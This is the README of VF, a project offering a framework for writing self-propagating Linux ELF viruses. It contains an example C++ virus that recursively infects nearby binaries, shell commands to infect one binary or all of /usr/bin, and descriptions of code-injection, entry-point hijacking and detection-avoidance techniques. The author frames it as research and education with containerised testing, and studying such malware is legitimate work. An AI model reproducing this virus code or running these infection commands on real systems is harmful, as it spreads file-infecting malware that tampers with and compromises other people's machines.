[![CircleCI](https://dl.circleci.com/status-badge/img/gh/yundddd/vf/tree/master.svg?style=svg&circle-token=e2d070ac00987abbcbd0410247d9dc9b4102775d)](https://dl.circleci.com/status-badge/redirect/gh/yundddd/vf/tree/master)
![](https://img.shields.io/badge/infects-x86_64-blue)
![](https://img.shields.io/badge/infects-aarch64-yellow)

<img width="300" src="https://github.com/yundddd/vf/assets/4584143/9aae2e9a-6d33-4455-9640-1688e475b3ac">


# VF: A Linux Virus Framework For ELF

The VF was originally an experiment to implement algorithms used in writing self-propagating code for linux. It gradually evolved into a generic framework providing building blocks for virus writing. To quote [Learning Linux Binary Analysis](https://www.packtpub.com/product/learning-linux-binary-analysis/9781782167105) Chapter 4:

> … it is a great engineering challenge that exceeds the regular conventions of programming, requiring the developer to think outside conventional paradigms
> and to manipulate the code, data, and environment into behaving a certain way….. While talking with the developers of the AV[anti-virus] software, I was amazed that next to none of them had any real idea of how to engineer a virus, let alone design any real heuristics for identifying them (other than signatures). The truth is that virus writing is difficult, and requires serious skill.

The main motivation of this framework is to help people understand how viruses work, make it easy to implement novel infection techniques and research them in a more controlled environment. Please cite this repo if you use the work here.

Various works by others were consulted and papers/POCs may be forked in `/third-party` in case things get lost (VX Heaven had a history of being taken offline due to unfounded legal prosecution).

Unfortunately most papers/blogs available on the internet:

- are rather dated and target 32-bit OSes,
- provide good theories with partially working POCs, or
- provide POCs that require specific versions of the compiler/arch.

The biggest barrier to improving infection algorithms/viruses is reproducibility. The VF attempts to address this problem by providing:

- working implementations (in a reasonable shape with documentations) for 64-bit OSes targeting both x86-64 and aarch64,
- hermetic toolchains ([zig-cc](https://github.com/uber/hermetic_cc_toolchain)/python/[bazel](https://bazel.build/)) so builds are reproducible; what works on my machine will also work on your mom's machine,
- unit tests/integration tests (in CI) infecting popular Linux distributions,
- a containerized development environment; easy to reset if things go south.

Most of the implementation is in modern C++, as we want to showcase writing viruses using high-level languages can be beneficial in terms of portability and development time; write code once and it will happily infect both x86-64 and aarch64 machines. Risc-v might be supported in the future.

# Building Blocks

The following example demonstrates how easy it is to write self propagating code with this framework.

Suppose we want to write a virus that prints `Hello World`:

```cpp
#include <cstddef>
#include "common/macros.hh"
#include "common/recursive_directory_iterator.hh"
#include "infector/pt_note_infector.hh"
#include "propagation/propagate.hh"
#include "redirection/entry_point.hh"

int main() {
  // The STR_LITERAL macro makes our string literal in text segment, which is
  // relocation safe.
  const char* str = STR_LITERAL("Hello World\n");

  vf::write(1, str, vf::strlen(str));

  // Propagate to binaries in the current directory recursively (2 levels deep)
  // in a forked process, using the pt_note method and entry point redirection.
  constexpr auto MAX_SEARCH_LEVEL = 2;
  vf::propagation::forked_propagate<
      vf::common::RecursiveDirectoryIterator<MAX_SEARCH_LEVEL>,
      vf::infector::PtNoteInfector, vf::redirection::EntryPointPatcher>();

  return 0;
}
```

You now have a virus that prints a harmless string to stdout before an infected host runs. It is ready to be bootstrapped by our [//infector](https://github.com/yundddd/vf/blob/master/infector/infect_victims.sh) and spread in your system following commands described in [this section](#Propagation).

### nostdlib

The VF provides a slimmed down version of the [libc](https://github.com/yundddd/vf/tree/master/nostdlib) (modified from kernel's [nolibc](https://github.com/torvalds/linux/blob/master/tools/include/nolibc/nolibc.h)) implementation since viruses cannot link against libraries in order to be self-contained. This means viruses must rely on no external linking, is position independent (PIC), and is able to dynamically adjust memory addresses based on the host. This implies we cannot refer to things that live outside of the `.text` section, or anything that doesn't use relative addressing. Our [nostdlib](https://github.com/yundddd/vf/tree/master/nostdlib) does not use `errno/environ` (globals) nor does it contain string literals living in `.rodata`. Some system calls however require initialized strings. To work around this, we provide a generic wrapper for you to define a string literal in text section with relative addressing code in [macro.hh](https://github.com/yundddd/vf/blob/master/common/macros.hh). Another option is that we can merge `.rodata\*` into `.text`. with a custom linker script (an option of cc_nostdlib_binary rule). Carrying an extra `.rodata` section increases code size which may lower transmission for certain infection algorithms.

### Infector

The VF presents the following infection algorithms:

| Algorithm    | x86_64 DYN         | x86_64 EXEC        | aarch64 DYN        | aarch64 EXEC       |
| ------------ | ------------------ | ------------------ | ------------------ | ------------------ |
| text_padding | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark: |
| reverse_text | :question:         | :heavy_check_mark: | :question:         | :heavy_check_mark: |
| pt_note      | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark: |

`text_padding` is the classic text segment code cave insertion method documented by Dr. Silvio Cesare in the 1990s. The original paper and POC are forked in `//third_party`.

`reverse_text` is an injection method described by Silvio in his paper and Ryan elfmaster O'Neill in his book `Learn Linux Binary Analysis``. Unfortunately none of them provided a working POC, nor have anyone on the internet AFAIK. The implementation in this repo works only on non-PIEs. Because gcc now compiles PIE by default nowadays this method would likely fade into the history book. Let me know if you think this can be engineered to work on PIEs.

`pt_note` is a powerful injection that has way less restrictions than previous ones on code size or binary type; it only needs a single pt_note section. However it could be relatively easy to detect such an injection. I have not found an implementation on the internet that works on PIEs. The version in this repo does.

Please see `//infector` for more details. I'm happy to add other infection algorithms if you can provide references.

### Redirector

After virus code is injected, we provide the following algorithms to redirect host execution to run the virus and then hand control back to the host as if nothing has happened. Please see [//redirection](https://github.com/yundddd/vf/tree/master/redirection) for more details. I have to admit that my x86 assembly knowledge is very limited. If you can help make things better please open a PR!

| Algorithm       | x86_64 DYN         | x86_64 EXEC        | aarch64 DYN        | aarch64 EXEC       |
| --------------- | ------------------ | ------------------ | ------------------ | ------------------ |
| entry_point     | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark: |
| libc_main_start | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark: |

`entry_point` hijacks the elf entry point to run the virus first.

`libc_main_start` is a novel redirection method, similar to [libc main argument hijacking](https://github.com/NickStephens/elfit), that leverages libc startup code to run the virus. I'm not able to provide a clean, unified implementation for libc main argument hijacking on both x86 and aarch64 so this variant was implemented instead.

### Infection Signature

To avoid repeatedly infecting the same victim with a virus, we provide a way to sign the victim so they can be skipped. Please see more in [//signature](https://github.com/yundddd/vf/tree/master/signature).

### Propagation

We have provided methods that can be called inside viruses to easier propagate itself to other binaries in [//propagation](https://github.com/yundddd/vf/tree/master/propagation). The propagation happens by making a copy of the host, injecting itself (virus) and then performing an atomic rename to replace the original host on disk, while maintaining the same ownerships and access permissions. Note that we propagate the entire virus as well as the code that does the propagation.

To improve the likelihood of infecting more hosts, some viruses might attempt large directory tree walks that can be noticeable. We allow users to choose how many layers of folders to walk (via a recursive directory iterator), or whether it should perform the walk in a forked process. Be aware that while forking might sound like a no-brainer, it could be equally noticeable/picked up by monitoring software.

To infect a single binary, run the following command:

```bash
# Build the infector and sample virus first
bazel build //virus/... //infector:infector
# Infect a single binary (a copy of /usr/bin/ls) using the `pt_note` algorithm.
infector/infect_victims.sh /tmp/bin/virus/test_virus.text /tmp/bin/infector/infector pt_note entry_point /usr/bin/ls
```

To infect all binaries from a path, run:

```bash
bazel build //virus/... //infector:infector
# Infect all binaries in /usr/bin using the `pt_note` algorithm.
infector/infect_victims.sh /tmp/bin/virus/test_virus.text /tmp/bin/infector/infector pt_note entry_point /usr/bin/
```

To infect a single binary with self-propagation, run the following command:

```bash
# Build the infector and sample virus first
bazel build //virus/... //infector:infector
# Infect a single binary (a copy of /usr/bin/ls) using the `pt_note` algorithm.
infector/infect_victims.sh /tmp/bin/virus/self_propagating_virus.text /tmp/bin/infector/infector pt_note entry_point /usr/bin/ls
cd /tmp && cp /usr/bin/pwd . && cp /usr/bin/ls .
# Run victim and let it propagate
./victim
# This binary is infected.
./ls
```

The scripts will make a copy of the victim binary and infect it with the provided virus.

> [!CAUTION]
> Please consult this [section](#development-process) before running these commands. You should never trust anything on the internet and run on workstations you care about.

### Build Rules

The `cc_nostdlib_binary` rule is provided for viruses and we can control what compiler options to use. It automatically creates a test to assert that the virus satisfies various properties to allow it to be relocated.

Similarly, the `cc_nostdlib_library` rule allows us to control build options for intermediate building blocks. Always prefer these build rules if your code can be a dependency for viruses.

### Integration Tests

While a reasonable amount of unit tests are provided for common C++ utils, we also provided docker rules to test our infection algorithm under popular linux distributions. The infection rule is wrapped in `infector_docker_image`. Run the following command to test all infection algorithm:

```
bazel test //infector/...
```

It will perform infection algorithms in all available docker images defined in WORKSPACE. Because our builds are deterministic, the same docker image being infected is also deterministic. You can print out the infection result for a specific algorithm with:

```
$ less /tmp/bin/infector/infect_ubuntu_jammy_pt_note_entry_point/infection_result.txt

Linux 1b9994481639 5.15.49-linuxkit-pr #1 SMP PREEMPT Thu May 25 07:27:39 UTC 2023 aarch64 aarch64 aarch64 GNU/Linux
VERSION_ID="22.04"
VERSION="22.04.3 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
 [/bin/[                                       ] == type: DYN   success
 [/bin/aarch64-linux-gnu-addr2line             ] == type: DYN   success
 [/bin/aarch64-linux-gnu-ar                    ] == type: DYN   success
 [/bin/aarch64-linux-gnu-as                    ] == type: DYN   success
 [/bin/aarch64-linux-gnu-c++filt               ] == type: DYN   success
 [/bin/aarch64-linux-gnu-cpp-11                ] == type: EXEC  success
 [/bin/aarch64-linux-gnu-dwp                   ] == type: DYN   success
 [/bin/aarch64-linux-gnu-elfedit               ] == type: DYN   success
 ...
Result: [/bin/*] infected: 272, failed: 0
```

### Example Viruses

To demonstrate what it takes to write a virus, we provided some examples to get users started quickly in [//virus](https://github.com/yundddd/vf/tree/master/virus)

# Disclaimer

No liability for the contents of this repository can be accepted. Use the concepts, examples and other content at your own risk. There may be errors and inaccuracies, that may of course be damaging to your system. Proceed with caution, the author does not take any responsibility.

# Contribution

I'm by no means an expert in this subject matter and will be happy to discuss ways to improve and accept PRs. Parts of the code base can use some clean-up. Here are some principles we should follow:

- Write simple but not perfect code. It's a huge win to infect 80% of the systems and trading off complexity, code size against 20% gain is probably not worth it.
- Write tests.
- Things should work for both x86-64 and aarch64.

# Development Process

### Docker containers

This framework is targeting both x86 and aarch64. Therefore we will need to run and test our code on two architectures. If you only intend to build on your native arch and you are already on some flavor of linux, all you need to do is to download and install [Bazel](https://github.com/bazelbuild/bazel/releases) after forking this repo. It is however still recommended to use docker to containerize any side effects from viruses from destroying your workstation.

The development is streamlined by docker, as switching between machines can be tedious; this section describes a workflow that can potentially work on all systems.

> [!NOTE]
> It is expected that emulating non-native arch would have noticeable performance impact and might even crash Bazel on workstations that don't have enough RAM. Also, gdb in qemu is not supported.

Acquire a development machine (mac, windows or linux) and install [docker desktop](https://www.docker.com/products/docker-desktop/). Also, fork this repo and clone it to your development machine, let's say, to `/home/$USER/vf`.

```bash
# go to https://github.com/yundddd/vf and press on the fork button to make a copy of the repo under your name.
# on development machine, run:
cd ~
git clone git@github.com:$YOUR_GIT_USERNAME/vf.git
```

Now, build images for x86 and aarch64, which will be used to create containers that can test your virus:

```bash
cd vf
./build_dev_images.sh && ./run_dev_containers.sh
```

These commands will make two containers (x86-64 and aarch64) available for you, with direct access to the cloned repo. You can build and debug code inside the containers from your host by:

```bash
# acquire a shell to the x86 container
./x86_shell.sh
$ USER@x86 ~/vf master

# acquire a shell to the aarch64 container
./aarch64_shell.sh
$ USER@aarch64 ~/vf master
```

The containers have set up everything (including Bazel) you need to build and debug your code. The repo is mounted at `/home/$USER/vf`. It is also in the sudoer file. Note that the machine type is displaced on the prompt in case you have multiple terminals running.

Under the hood, these two containers mount our repo and all share the same code with our development host. In other words, any changes to our code will be immediately available to build and run inside our containers.

> [!NOTE]
> The containers do not have permission to push to your repo, in fact they don't even have a git user or email setup to commit any changes. Ideally you should only commit and push from your trusted development machine outside of docker.

> [!TIP]
> Users should not save any important data in containers as they do not preserve states upon shutdown. If there is any update to dockerfile, re-run these commands to refresh the containers. A typical workflow is to use vscode to modify code outside but build and test inside containers.

# References

The follow sources were consulted:

[https://vf-underground.org/](https://vf-underground.org/)

[The ELF Virus Writing HOWTO](http://www.ouah.org/virus-writing-HOWTO/index.html)

[elfit](https://github.com/NickStephens/elfit)

[Learning-Linux-Binary-Analysis](https://github.com/PacktPublishing/Learning-Linux-Binary-Analysis/tree/master)

[Unix ELF parasites and virus](https://vxug.fakedoma.in/archive/VxHeaven/lib/vsc01.html)

[KAAL_BHAIRAV](https://github.com/compilepeace/KAAL_BHAIRAV)

[linux nolibc](https://github.com/torvalds/linux/blob/master/tools/include/nolibc/nolibc.h)
